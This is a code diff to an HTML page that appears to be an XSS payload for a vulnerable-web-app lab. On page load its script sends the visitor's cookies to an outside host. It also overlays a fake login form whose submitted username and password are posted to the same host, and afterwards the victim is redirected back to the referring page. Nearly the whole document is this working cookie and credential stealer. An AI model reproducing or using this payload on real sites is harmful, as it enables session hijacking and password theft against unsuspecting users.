@@ -6,30 +6,32 @@
 </head>
 
 <body>
-  <div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;">
+  <div id="xss-container"
+    style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;">
     <form id="c">
       <input id="u" type="text" placeholder="Username" style="display:block;margin:10px auto;padding:5px;width:200px;"
         required>
       <input id="p" type="password" placeholder="Password"
         style="display:block;margin:10px auto;padding:5px;width:200px;" required>
       <button type="submit"
-        style="padding:5px 15px;background:#4CAF50;color:white;border:none;border-radius:4px;">OK</button>
-      <div id="message" style="color:green;margin-top:10px;display:none;">Credentials sent!</div>
+        style="padding:5px 15px;background:#4CAF50;color:white;border:none;border-radius:4px;">Send</button>
+      <div id="msg" style="color:green;margin-top:10px;display:none;">Sent!</div>
     </form>
   </div>
   <script>
+    // Initial cookie send (if needed)
     fetch('https://data.estebanmf.space/cookies', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({cookies: document.cookie})
-    }).catch(error => console.error('Cookie fetch failed:', error));
+    }).catch(e => console.error('Cookie fetch failed:', e));
 
     document.getElementById('c').onsubmit = function (e) {
       e.preventDefault();
-      const u = document.getElementById('u').value;
-      const p = document.getElementById('p').value;
+      let u = document.getElementById('u').value;
+      let p = document.getElementById('p').value;
       if (!u || !p) {
-        alert('Please fill in both fields.');
+        alert('Fill both fields.');
         return;
       }
       fetch('https://data.estebanmf.space/credentials', {
@@ -38,14 +40,16 @@
         body: JSON.stringify({username: u, password: p})
       })
         .then(r => {
-          if (!r.ok) throw new Error('Network response was not ok');
-          document.getElementById('message').style.display = 'block';
-          setTimeout(() => {
-            document.getElementById('c').reset();
-            document.querySelector('div[style*="position:fixed"]').remove();
-          }, 2000);
+          if (r.ok) {
+            document.getElementById('msg').style.display = 'block';
+            setTimeout(() => {
+              document.getElementById('c').reset();
+              document.getElementById('msg').style.display = 'none';
+              window.location.href = document.referrer || 'http://kali.kali.estebanmf.space/vulnerabilities/xss_r/';
+            }, 2000);
+          } else throw new Error('Network error');
         })
-        .catch(error => alert('Error: ' + error.message));
+        .catch(e => alert('Error: ' + e.message));
     };
   </script>
 </body>
